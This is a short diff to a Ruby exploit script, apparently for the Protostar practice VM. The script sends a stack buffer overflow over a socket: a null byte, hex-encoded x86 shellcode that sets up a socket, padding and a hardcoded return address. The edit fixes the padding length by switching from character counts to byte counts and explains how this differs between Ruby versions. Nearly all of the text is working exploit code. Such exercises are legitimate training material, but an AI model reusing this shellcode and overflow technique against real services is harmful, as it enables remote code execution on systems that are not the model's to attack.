@@ -34,11 +34,12 @@ PORTHL + "\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x
 # 0xbffffa48 + null_byte.length (which is 4 bytes) = 0xbffffa4c
 shellcode_addr = "\x4c\xfa\xff\xbf"
 
-# fun fact:
-# if your ruby version is 2.6.8,
-# than irb shellcode.length and you will get freaking 98
-# thankyou, ruby
-padding = "A" * (532 - null_byte.length - 108) + shellcode_addr
+# String#length: Returns the count of characters (not bytes) in self
+# String#bytesize: Returns the count of bytes in self
+# in protostar, ruby version is 1.8.7 and the result of shellcode.length is 108 (which is correct)
+# however if your ruby is newer like 2.6.8 than the result of shellcode.length is 98 (much smaller)
+# shellcode.bytesize has the same result in two different versions of Ruby
+padding = "A" * (532 - null_byte.bytesize - shellcode.bytesize) + shellcode_addr
 
 response = null_byte + shellcode + padding + shellcode_addr
 socket.puts(response)
